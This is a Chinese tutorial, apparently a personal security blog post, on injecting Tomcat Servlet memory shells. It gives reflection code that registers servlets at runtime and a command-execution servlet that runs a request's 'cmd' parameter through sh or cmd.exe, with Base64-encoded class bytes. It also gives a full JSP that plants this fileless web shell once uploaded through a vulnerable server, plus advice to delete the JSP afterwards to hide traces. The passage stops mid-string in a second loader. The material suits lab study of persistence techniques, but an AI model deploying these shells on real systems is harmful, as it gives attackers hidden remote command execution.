# 通过模拟 servletContext.addServlet 注册 Servlet 内存马

> [JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)](https://su18.org/post/memory-shell/#servlet-内存马)

---

- [通过模拟 servletContext.addServlet 注册 Servlet 内存马](#通过模拟-servletcontextaddservlet-注册-servlet-内存马)
  - [Servlet内存马基本知识](#servlet内存马基本知识)
  - [模拟 Servlet 动态加载](#模拟-servlet-动态加载)
    - [编写一个示例 Servlet](#编写一个示例-servlet)
    - [动态加载示例Servlet](#动态加载示例servlet)
  - [构造恶意Servlet并动态加载](#构造恶意servlet并动态加载)
  - [在外部通过写入/上传 JSP 文件自动部署恶意 Servlet](#在外部通过写入上传-jsp-文件自动部署恶意-servlet)
    - [明文 Servlet](#明文-servlet)
    - [通过解析Class Base64 字符串注入恶意Servlet](#通过解析class-base64-字符串注入恶意servlet)

---

## Servlet内存马基本知识

Servlet 是 Server Applet（服务器端小程序）的缩写，用来读取客户端发送的数据，处理并返回结果。也是最常见的 Java 技术之一

与 Filter 相同，本小节也仅仅讨论使用 ServletContext 的相关方法添加 Servlet。

还是首先来看一下实现类 ApplicationContext 的 `addServlet` 方法:

![img](http://cdn.ayusummer233.top/DailyNotes/202409291130585.png)

与上一小节看到的 `addFilter` 方法十分类似。那么我们面临同样的问题，在一次访问到达 Tomcat 时，是如何匹配到具体的 Servlet 的？这个过程简单一点，只有两部走：

- ApplicationServletRegistration 的 `addMapping` 方法调用 `StandardContext#addServletMapping` 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）
- 同时在 servletMappings 中添加 URL 路径与 name 的映射。

这里直接调用相关方法进行添加，当然是用反射直接写入也可以，有一些逻辑较为复杂。

---

## 模拟 Servlet 动态加载

开发与测试环境可以用 Tomcat Filter 内存马中的环境, 是一样的

---

### 编写一个示例 Servlet

```java
package com.summer233;

import java.io.IOException;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

public class SummerBasicServlet implements Servlet {
   public SummerBasicServlet() {
   }

   @Override
   public void init(ServletConfig servletConfig) throws ServletException {
   }

   @Override
   public ServletConfig getServletConfig() {
      return null;
   }

   @Override
   public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
      servletResponse.getWriter().println("this is a new Servlet");
      // PS: 不可以像下面这样输出中文, 否则后面动态注册Servlet会失败而且没有日志(
      // servletResponse.getWriter().println("这是一个新增Servlet");
   }

   @Override
   public String getServletInfo() {
      return null;
   }

   @Override
   public void destroy() {
   }
}

```

`mvn clean package` 编译完成后取 class 文件编码成 Base64 字符串

![image-20240929170709368](http://cdn.ayusummer233.top/DailyNotes/202409291707532.png)

```txt
yv66vgAAAEEANAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCwAIAAkHAAoMAAsADAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAA4BABV0aGlzIGlzIGEgbmV3IFNlcnZsZXQKABAAEQcAEgwAEwAUAQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYHABYBACBjb20vc3VtbWVyMjMzL1N1bW1lckJhc2ljU2VydmxldAcAGAEAFWphdmF4L3NlcnZsZXQvU2VydmxldAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAiTGNvbS9zdW1tZXIyMzMvU3VtbWVyQmFzaWNTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHACQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7BwAuAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAF1N1bW1lckJhc2ljU2VydmxldC5qYXZhACEAFQACAAEAFwAAAAYAAQAFAAYAAQAZAAAAMwABAAEAAAAFKrcAAbEAAAACABoAAAAKAAIAAAALAAQADAAbAAAADAABAAAABQAcAB0AAAABAB4AHwACABkAAAA1AAAAAgAAAAGxAAAAAgAaAAAABgABAAAAEAAbAAAAFgACAAAAAQAcAB0AAAAAAAEAIAAhAAEAIgAAAAQAAQAjAAEAJQAmAAEAGQAAACwAAQABAAAAAgGwAAAAAgAaAAAABgABAAAAFAAbAAAADAABAAAAAgAcAB0AAAABACcAKAACABkAAABOAAIAAwAAAAwsuQAHAQASDbYAD7EAAAACABoAAAAKAAIAAAAZAAsAHAAbAAAAIAADAAAADAAcAB0AAAAAAAwAKQAqAAEAAAAMACsALAACACIAAAAGAAIAIwAtAAEALwAwAAEAGQAAACwAAQABAAAAAgGwAAAAAgAaAAAABgABAAAAIAAbAAAADAABAAAAAgAcAB0AAAABADEABgABABkAAAArAAAAAQAAAAGxAAAAAgAaAAAABgABAAAAJQAbAAAADAABAAAAAQAcAB0AAAABADIAAAACADM=
```

---

### 动态加载示例Servlet

直接沿用上一节中动态添加 Filter 的开发环境与项目即可

DynamicAddServlet

- `src/main`
  - `java/com/summer233`
    - [DemoServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/DemoServlet.java)
    - [IndexServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/java/com/summer233/IndexServlet.java)
    - (*)[DynamicUtils.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Filter/dynamic-filter-demo/src/main/java/com/summer233/DynamicUtils.java)
    - [AddTomcatFilter.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Filter/dynamic-filter-demo/src/main/java/com/summer233/AddTomcatFilter.java)
    - (*)[AddTomcatServlet.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/Servlet/addServlet/dynamic-add-servlet/src/main/java/com/summer233/AddTomcatServlet.java)
  - `webapp/WEB-INF`
    - [web.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/src/main/webapp/WEB-INF/web.xml)
- [pom.xml](https://github.com/233Official/DailyNotesCode/blob/main/Java/Web/Tomcat/ServlerAPI/demo/pom.xml)

---

其中 `AddTomcatServlet.java`  与 `AddTomcatFilter` 大同小异, 这里就不做过多解释了

```java
package com.summer233;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;

// import static com.summer233.DynamicUtils.SERVLET_CLASS_STRING;
import static com.summer233.DynamicUtils.BASIC_SEVLET_CLASS_STRING_BASE64;



/**
 * 访问这个 Servlet 将会动态添加自定义 Servlet
 * 测试版本 Tomcat 8.5.100
 *
 * @author su18,233
 */

@WebServlet(name = "DynamicAddTomcatServlet", urlPatterns = "/dynamicAddServlet")
public class AddTomcatServlet extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {
            PrintWriter writer = resp.getWriter();
            writer.println("debug info print test: start to add servlet<br>");
			String servletName = "summerDynamicAddServletBasic";

			// 从 request 中获取 servletContext
			ServletContext servletContext = req.getServletContext();

			// 如果已有此 servletName 的 Servlet，则不再重复添加
			if (servletContext.getServletRegistration(servletName) == null) {

				StandardContext o = null;

				// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
				while (o == null) {
					Field f = servletContext.getClass().getDeclaredField("context");
					f.setAccessible(true);
					Object object = f.get(servletContext);

					switch (object) {
						case ServletContext sc -> servletContext = sc;
						case StandardContext sc -> o = sc;
						default -> throw new IllegalStateException("Unexpected value: " + object);
					}
				}

				// 创建自定义 Servlet
				// Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);
				Class<?> servletClass = DynamicUtils.getClass(BASIC_SEVLET_CLASS_STRING_BASE64);
				

				// 使用 Wrapper 封装 Servlet
				Wrapper wrapper = o.createWrapper();
				wrapper.setName(servletName);
				wrapper.setLoadOnStartup(1);
				// wrapper.setServlet((Servlet) servletClass.newInstance());
				// 上述函数似乎 deprecated 了, 使用下面的函数
				wrapper.setServlet((Servlet) servletClass.getDeclaredConstructor().newInstance());
				wrapper.setServletClass(servletClass.getName());

				// 向 children 中添加 wrapper
				o.addChild(wrapper);

				// 添加 servletMappings
				// o.addServletMapping("/basicServlet", servletName);
				// 上述函数似乎 deprecated 了, 使用下面的函数
				o.addServletMappingDecoded("/basicServlet", servletName);
				writer.println("tomcat servlet added");

			} else{
				writer.println("servlet already exists");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
```

`mvn clean package` 生成目标 war 文件部署到 `tomcat:8` 的 webapps 目录下

![image-20240929171908431](http://cdn.ayusummer233.top/DailyNotes/202409291719527.png)

访问  `/dynamicAddServlet` 添加 Servlet:

![image-20240929171958291](http://cdn.ayusummer233.top/DailyNotes/202409291719347.png)

访问 `/basicServlet`查看结果:

![image-20240929172023720](http://cdn.ayusummer233.top/DailyNotes/202409291720791.png)

---

## 构造恶意Servlet并动态加载

```java
package com.summer233;

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;

public class SummerCMDServlet implements Servlet {
   public SummerCMDServlet() {
   }

   @Override
   public void init(ServletConfig servletConfig) throws ServletException {
   }

   @Override
   public ServletConfig getServletConfig() {
      return null;
   }

   @Override
   public void service(ServletRequest servletRequest, ServletResponse servletResponse)
         throws ServletException, IOException {
      servletResponse.setContentType("text/html; charset=UTF-8");
      servletResponse.setCharacterEncoding("UTF-8");
      servletResponse.getWriter().println("this is a SummerCMDServlet<br>");
      HttpServletRequest req = (HttpServletRequest) servletRequest;
      String cmd = req.getParameter("cmd");
      if (cmd != null) {
         boolean isLinux = true;
         String osTyp = System.getProperty("os.name");
         if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
         }
         String[] cmds = isLinux ? new String[] { "sh", "-c", cmd }
               : new String[] { "cmd.exe", "/c", cmd };
         InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
         Scanner s = new Scanner(in).useDelimiter("\\a");
         String output = s.hasNext() ? s.next() : "";
         try (PrintWriter responseWriter = servletResponse.getWriter()) {
            responseWriter.println(output);
            responseWriter.flush();
         }
      }
   }

   @Override
   public String getServletInfo() {
      return null;
   }

   @Override
   public void destroy() {
   }
}

```

`mvn clean package` 编译后取 class 文件编码为 Base64 字符串:

```
yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAHnRoaXMgaXMgYSBTdW1tZXJDTURTZXJ2bGV0PGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgcAIAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QIACIBAANjbWQLAB8AJAwAJQAmAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsIACgBAAdvcy5uYW1lCgAqACsHACwMAC0AJgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQoALwAwBwAxDAAyADMBABBqYXZhL2xhbmcvU3RyaW5nAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwgANQEAA3dpbgoALwA3DAA4ADkBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWggAOwEAAnNoCAA9AQACLWMIAD8BAAdjbWQuZXhlCABBAQACL2MKAEMARAcARQwARgBHAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBDAEkMAEoASwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBNAE4HAE8MAFAAUQEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwcAUwEAEWphdmEvdXRpbC9TY2FubmVyCgBSAFUMAAUAVgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVggAWAEAAlxhCgBSAFoMAFsAXAEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwoAUgBeDABfAGABAAdoYXNOZXh0AQADKClaCgBSAGIMAGMAMwEABG5leHQIAGUBAAAKABsAZwwAaAAGAQAFZmx1c2gKABsAagwAawAGAQAFY2xvc2UHAG0BABNqYXZhL2xhbmcvVGhyb3dhYmxlCgBsAG8MAHAAcQEADWFkZFN1cHByZXNzZWQBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYHAHMBAB5jb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQHAHUBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAgQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5yZXNwb25zZVdyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAA1TdGFja01hcFRhYmxlBwCbAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAcAjQcAngEAE2phdmEvaW8vSW5wdXRTdHJlYW0HAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAOZ2V0U2VydmxldEluZm8BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAFVN1bW1lckNNRFNlcnZsZXQuamF2YQAhAHIAAgABAHQAAAAGAAEABQAGAAEAdgAAADMAAQABAAAABSq3AAGxAAAAAgB3AAAACgACAAAAEAAEABEAeAAAAAwAAQAAAAUAeQB6AAAAAQB7AHwAAgB2AAAANQAAAAIAAAABsQAAAAIAdwAAAAYAAQAAABUAeAAAABYAAgAAAAEAeQB6AAAAAAABAH0AfgABAH8AAAAEAAEAgAABAIIAgwABAHYAAAAsAAEAAQAAAAIBsAAAAAIAdwAAAAYAAQAAABkAeAAAAAwAAQAAAAIAeQB6AAAAAQCEAIUAAgB2AAACjQAEAA4AAADsLBIHuQAJAgAsEg+5ABECACy5ABQBABIYtgAaK8AAH04tEiG5ACMCADoEGQTGAL8ENgUSJ7gAKToGGQbGABMZBrYALhI0tgA2mQAGAzYFFQWZABkGvQAvWQMSOlNZBBI8U1kFGQRTpwAWBr0AL1kDEj5TWQQSQFNZBRkEUzoHuABCGQe2AEi2AEw6CLsAUlkZCLcAVBJXtgBZOgkZCbYAXZkACxkJtgBhpwAFEmQ6Ciy5ABQBADoLGQsZCrYAGhkLtgBmGQvGACYZC7YAaacAHjoMGQvGABQZC7YAaacADDoNGQwZDbYAbhkMv7EAAgC3AMMA0ABsANcA3ADfAGwAAwB3AAAAVgAVAAAAHwAIACAAEAAhABsAIgAgACMAKgAkAC8AJQAyACYAOQAnAEsAKABOACoAaQArAH4ALACLAC0AmwAuAK8ALwC3ADAAvgAxAMMAMgDQAC8A6wA0AHgAAAB6AAwAtwA0AIYAhwALADIAuQCIAIkABQA5ALIAigCLAAYAfgBtAIwAjQAHAIsAYACOAI8ACACbAFAAkACRAAkArwA8AJIAiwAKAAAA7AB5AHoAAAAAAOwAkwCUAAEAAADsAJUAlgACACAAzACXAJgAAwAqAMIAIgCLAAQAmQAAAKMACf8ATgAHBwByBwCaBwAKBwAfBwAvAQcALwAAGlIHAJz+AC4HAJwHAJ0HAFJBBwAv/wAiAAwHAHIHAJoHAAoHAB8HAC8BBwAvBwCcBwCdBwBSBwAvBwAbAAEHAGz/AA4ADQcAcgcAmgcACgcAHwcALwEHAC8HAJwHAJ0HAFIHAC8HABsHAGwAAQcAbAj/AAIABQcAcgcAmgcACgcAHwcALwAAAH8AAAAGAAIAgACfAAEAoQAzAAEAdgAAACwAAQABAAAAAgGwAAAAAgB3AAAABgABAAAAOAB4AAAADAABAAAAAgB5AHoAAAABAKIABgABAHYAAAArAAAAAQAAAAGxAAAAAgB3AAAABgABAAAAPQB4AAAADAABAAAAAQB5AHoAAAABAKMAAAACAKQ=
```

相应修改项目代码重新编译并部署到 `tomcat:8` docker 中

访问 `/dynamicAddServlet` 注册恶意 Servlet:

![image-20240930105327794](http://cdn.ayusummer233.top/DailyNotes/202409301053894.png)

尝试命令执行: `/summerCMDServlet?cmd=date`

![image-20240930105355375](http://cdn.ayusummer233.top/DailyNotes/202409301053456.png)

---

## 在外部通过写入/上传 JSP 文件自动部署恶意 Servlet

### 明文 Servlet

```jsp
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="javax.servlet.Servlet" %>
<%@ page import="javax.servlet.ServletConfig" %>
<%@ page import="javax.servlet.ServletRequest" %>
<%@ page import="javax.servlet.ServletResponse" %>
<%@ page import="javax.servlet.ServletException" %>
<%@ page import="org.apache.catalina.Wrapper" %> 
<%@ page import="java.lang.reflect.Field" %>

<%! 
    // 创建恶意Servlet
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            boolean isLinux = true;
            InputStream inOS = Runtime.getRuntime().exec("whoami").getInputStream();
            Scanner scannerOS = new Scanner(inOS).useDelimiter("\\a");
            String outputOS = scannerOS.hasNext() ? scannerOS.next() : "";
            // 如果输出中包含 \ 则说明是Windows, 毕竟 Linux 用户没有域名, Windows 的 whoami 输出是 域名\用户名
            if (outputOS.contains("\\")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {

        }
    };
%>

<%
    // 获取StandardContext
    StandardContext standardCtx = null;
    ServletContext servletContext = request.getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    Object appContext = appContextField.get(servletContext);

    Field standardCtxField = appContext.getClass().getDeclaredField("context");
    standardCtxField.setAccessible(true);
    standardCtx = (StandardContext) standardCtxField.get(appContext);

    if (standardCtx != null) {
        // 用Wrapper对其进行封装
        org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
        newWrapper.setName("dynamicAddServletPlainClass");
        newWrapper.setLoadOnStartup(1);
        newWrapper.setServlet(servlet);
        newWrapper.setServletClass(servlet.getClass().getName());

        // 添加封装后的恶意Wrapper到StandardContext的children当中
        standardCtx.addChild(newWrapper);

        // 添加ServletMapping将访问的URL和Servlet进行绑定
        standardCtx.addServletMappingDecoded("/dynamicAddServletPlainClass", "dynamicAddServletPlainClass");
        out.println("Successfully added a new servlet to StandardContext");
    } else {
        out.println("Failed to get StandardContext");
    }
%>
```

这里漏洞利用的部分就不做展示了, 可以参考 [s2-045内存马 | DailyNotes](http://127.0.0.1:9211/dailynotes/网络安全/Web安全/内存马/Java内存马/Struts2内存马/s2-045内存马.html) 这个命令执行漏洞的写入方案

> 文件上传漏洞直接仿照 poc/exp 传文件即可,命令执行要写内存马的话需要根据 poc/exp 修改写文件的 payload 写入文件, 上面链接的 s2-045 漏洞比较特殊, 写文件的方法还是比较麻烦的

这里我直接把这个 jsp 文件放到了 `tomcat:8` 的 `webapps/ROOT` 目录下

![image-20240930145540201](http://cdn.ayusummer233.top/DailyNotes/202409301455413.png)

访问 `/dynamicAddServletPlainClass.jsp` 看到如下信息说明恶意 Servlet 已经添加成功:

![image-20240930145702754](http://cdn.ayusummer233.top/DailyNotes/202409301457914.png)

然后就可以尝试执行命令了: `/dynamicAddServletPlainClass?cmd=id`

![image-20240930145752186](http://cdn.ayusummer233.top/DailyNotes/202409301457471.png)

> 注入完记得把 jsp 删掉

---

### 通过解析Class Base64 字符串注入恶意Servlet

```jsp
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %> 
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Method" %>

<%!
    String SUMMER_CMD_SERVLET_CLASS_STRING_BASE64 = "yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAHnRoaXMgaXMgYSBTdW1tZXJDTURTZXJ2bGV0PGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgcAIAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QIACIBAANjbWQLAB8AJAwAJQAmAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsIACgBAAdvcy5uYW1lCgAqACsHACwMAC0AJgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQoALwAwBwAxDAAyADMBABBqYXZhL2xhbmcvU3RyaW5nAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwgANQEAA3dpbgoALwA3DAA4ADkBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWggAOwEAAnNoCAA9AQACLWMIAD8BAAdjbWQuZXhlCABBAQACL2MKAEMARAcARQwARgBHAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBDAEkMAEoASwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBNAE4HAE8MAFAAUQEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwcAUwEAEWphdmEvdXRpbC9TY2FubmVyCgBSAFUMAAUAVgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVggAWAEAAlxhCgBSAFoMAFsAXAEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwoAUgBeDABfAGABAAdoYXNOZXh0AQADKClaCgBSAGIMAGMAMwEABG5leHQIAGUBAAAKABsAZwwAaAAGAQAFZmx1c2gKABsAagwAawAGAQAFY2xvc2UHAG0BABNqYXZhL2xhbmcvVGhyb3dhYmxlCgBsAG8MAHAAcQEADWFkZFN1cHByZXNzZWQBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYHAHMBAB5jb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQHAHUBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAgQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5yZXNwb25zZVdyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAA1TdGFja01hcFRhYmxlBwCbAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAcAjQcAngEAE2phdmEvaW8vSW5wdXRTdHJlYW0HAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAOZ2V0U2VydmxldEluZm8BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAFVN1bW1lckNNRFNlcnZsZXQuamF2